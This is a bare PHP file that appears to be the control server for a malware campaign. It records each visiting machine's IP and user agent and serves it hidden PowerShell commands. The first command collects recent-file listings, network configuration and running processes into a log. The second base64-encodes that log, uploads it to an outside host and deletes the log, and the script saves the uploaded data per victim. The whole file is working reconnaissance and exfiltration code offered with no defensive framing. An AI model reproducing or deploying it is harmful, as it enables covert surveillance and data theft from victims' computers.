<?php
	error_reporting(E_ALL);
	
	header("Expires: on, 01 Jan 1970 00:00:00 GMT");
	header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
	header("Cache-Control: post-check=0, pre-check=0", false);
	header("Pragma: no-cache");
	header("Content-type:text/html; charset=UTF-8");
	header('Access-Control-Allow-Origin: *');
	date_default_timezone_set('America/New_York');

    $stone1 = "cmd /c start /min powershell.exe \$logfile=\$env:appdata+'\cuu.log';\$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'));\$ic = ipconfig /all;ac \$logfile \$rc -Encoding 'utf8';ac \$logfile \$ic;\$gp=Get-process;ac \$logfile \$gp";
    
    $stone2 = "cmd /c start /min powershell.exe \$sf=\$env:appdata+'\cuu.log';\$mu='http://pyb.n-e.kr/miner/st.php';\$hd=[IO.File]::readallbytes(\$sf);\$b6=[System.Convert]::ToBase64String(\$hd);\$b6=[regex]::Replace(\$b6,'=','%');\$sendData='trig='+\$b6;Invoke-WebRequest -Uri \$mu -Method Post -Body \$sendData;Remove-Item \$sf -force";
    
	$ip = $_SERVER['REMOTE_ADDR'];
	$agent=$_SERVER['HTTP_USER_AGENT'];
    
    if(isset($_POST['trig']))	
	{
		$rcvdata = $_POST['trig'];
	
		$rcvdata = str_replace("%" , "=" , $rcvdata);
		$rcvdata = str_replace(" " , "+" , $rcvdata);
		$rcvdata = base64_decode($rcvdata);
		
		$fp = fopen($ip."_carry.txt" , "w");
		fwrite($fp, $rcvdata);
		fclose($fp);
	}
	
	if(!is_dir($ip."_1")) {
	    mkdir($ip."_1");
	    $ip_agent_file = $ip."_1/agent.txt";
	    $fp = fopen($ip_agent_file,"w");
    	fwrite($fp, date("Y-m-d H:i")."\r\n".$ip."\r\n".$agent."\r\n");
    	fclose($fp);
    	echo "$stone1";
	}
	else {
	    mkdir($ip."_2");
	    $ip_agent_file = $ip."_2/agent.txt";
	    $fp = fopen($ip_agent_file,"w");
    	fwrite($fp, date("Y-m-d H:i")."\r\n".$ip."\r\n".$agent."\r\n");
    	fclose($fp);
    	echo "$stone2";
	}


?>